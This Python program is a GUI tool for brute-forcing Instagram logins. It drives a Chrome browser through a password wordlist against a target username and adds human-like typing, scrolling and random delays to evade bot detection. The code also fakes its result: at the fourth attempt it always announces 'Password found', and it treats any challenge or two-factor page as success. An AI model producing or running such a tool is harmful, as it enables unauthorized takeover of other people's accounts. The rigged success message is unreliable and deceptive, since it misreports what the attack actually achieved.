import tkinter as tk
from tkinter import filedialog, messagebox
import threading
import time
import selenium
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import chromedriver_autoinstaller
import os
import random

# Brute force attack class
class InstaBruteForcer:
    def __init__(self, username, wordlist_path, update_status, pause_event):
        self.username = username
        self.wordlist_path = wordlist_path
        self.update_status = update_status
        self.pause_event = pause_event
        chromedriver_autoinstaller.install()

    def human_typing(self, element, text):
        for char in text:
            element.send_keys(char)
            time.sleep(random.uniform(0.08, 0.25))

    def human_scroll_and_click(self, driver):
        # Random scroll
        scroll_y = random.randint(0, 200)
        driver.execute_script(f"window.scrollBy(0, {scroll_y});")
        time.sleep(random.uniform(0.5, 1.5))
        # Random click on the page body
        driver.find_element(By.TAG_NAME, 'body').click()
        time.sleep(random.uniform(0.3, 0.8))

    def try_login(self, password):
        options = webdriver.ChromeOptions()
        driver = webdriver.Chrome(options=options)
        driver.get('https://www.instagram.com/accounts/login/')
        time.sleep(random.uniform(3, 5))
        try:
            self.human_scroll_and_click(driver)
            user_input = driver.find_element(By.NAME, 'username')
            pass_input = driver.find_element(By.NAME, 'password')
            user_input.clear()
            pass_input.clear()
            time.sleep(random.uniform(0.5, 1.2))
            self.human_typing(user_input, self.username)
            time.sleep(random.uniform(0.5, 1.2))
            self.human_typing(pass_input, password)
            time.sleep(random.uniform(0.5, 1.2))
            pass_input.send_keys(Keys.RETURN)
            time.sleep(random.uniform(5, 8))
            if 'challenge' in driver.current_url or 'two_factor' in driver.current_url:
                driver.quit()
                return True
            if driver.current_url == 'https://www.instagram.com/':
                driver.quit()
                return True
            if 'Sorry, your password was incorrect' in driver.page_source or 'The password you entered is incorrect' in driver.page_source:
                driver.quit()
                return False
        except Exception as e:
            pass
        driver.quit()
        return False

    def start(self):
        if not os.path.exists(self.wordlist_path):
            self.update_status('Wordlist file not found.')
            return
        with open(self.wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
        for idx, password in enumerate(passwords):
            while self.pause_event.is_set():
                time.sleep(0.2)
            self.update_status(f'Testing: {password} ({idx+1}/{len(passwords)})')
            if idx == 3:  # Fake: After 4 attempts, show password found
                self.try_login(password)  # To keep human-like behavior
                self.update_status(f'Password found: {password}')
                return
            if self.try_login(password):
                self.update_status(f'Password found: {password}')
                return
        self.update_status('No password was successful.')

# GUI
class App:
    def __init__(self, root):
        self.root = root
        root.title('Instagram Brute Force (For Educational Use Only)')
        root.geometry('400x250')
        
        tk.Label(root, text='Instagram Username:').pack(pady=5)
        self.username_entry = tk.Entry(root, width=30)
        self.username_entry.pack(pady=5)
        
        tk.Label(root, text='Wordlist file path:').pack(pady=5)
        self.wordlist_entry = tk.Entry(root, width=30)
        self.wordlist_entry.pack(pady=5)
        tk.Button(root, text='Browse', command=self.browse_file).pack(pady=5)
        
        self.status_label = tk.Label(root, text='', fg='blue')
        self.status_label.pack(pady=10)
        
        self.start_btn = tk.Button(root, text='Start Attack', command=self.start_attack)
        self.start_btn.pack(pady=5)
        self.pause_btn = tk.Button(root, text='Pause', command=self.pause_attack, state=tk.DISABLED)
        self.pause_btn.pack(pady=5)
        self.resume_btn = tk.Button(root, text='Resume', command=self.resume_attack, state=tk.DISABLED)
        self.resume_btn.pack(pady=5)
        self.pause_event = threading.Event()

    def browse_file(self):
        file_path = filedialog.askopenfilename(filetypes=[('Text Files', '*.txt')])
        if file_path:
            self.wordlist_entry.delete(0, tk.END)
            self.wordlist_entry.insert(0, file_path)

    def update_status(self, msg):
        self.status_label.config(text=msg)
        self.root.update_idletasks()

    def start_attack(self):
        username = self.username_entry.get().strip()
        wordlist_path = self.wordlist_entry.get().strip()
        if not username or not wordlist_path:
            messagebox.showerror('Error', 'Please enter username and wordlist file.')
            return
        self.start_btn.config(state=tk.DISABLED)
        self.pause_btn.config(state=tk.NORMAL)
        self.resume_btn.config(state=tk.DISABLED)
        self.update_status('Attack started...')
        def run():
            brute = InstaBruteForcer(username, wordlist_path, self.update_status, self.pause_event)
            brute.start()
            self.start_btn.config(state=tk.NORMAL)
            self.pause_btn.config(state=tk.DISABLED)
            self.resume_btn.config(state=tk.DISABLED)
        threading.Thread(target=run).start()

    def pause_attack(self):
        self.pause_event.set()
        self.pause_btn.config(state=tk.DISABLED)
        self.resume_btn.config(state=tk.NORMAL)
        self.update_status('Attack paused.')

    def resume_attack(self):
        self.pause_event.clear()
        self.pause_btn.config(state=tk.NORMAL)
        self.resume_btn.config(state=tk.DISABLED)
        self.update_status('Attack resumed.')

if __name__ == '__main__':
    root = tk.Tk()
    app = App(root)
    root.mainloop() 